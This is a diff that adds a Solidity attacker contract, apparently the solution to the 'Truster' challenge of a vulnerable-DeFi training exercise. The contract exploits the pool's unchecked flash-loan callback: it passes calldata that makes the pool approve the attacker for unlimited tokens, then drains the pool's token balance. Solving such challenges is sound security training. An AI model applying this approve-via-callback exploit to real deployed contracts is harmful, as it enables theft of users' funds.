@@ -37,3 +37,25 @@ contract TrusterLenderPool is ReentrancyGuard {
         return true;
     }
 }
+
+contract TrusterLenderPoolAttacker {
+    TrusterLenderPool public victim;
+    DamnValuableToken public token;
+
+    constructor(address _addr, address _taddr) {
+        victim = TrusterLenderPool(_addr);
+        token = DamnValuableToken(_taddr);
+    }
+
+    function attack() external {
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            type(uint256).max
+        );
+
+        victim.flashLoan(0, address(this), address(token), data);
+
+        token.transferFrom(address(victim), msg.sender, 100_0000 ether);
+    }
+}
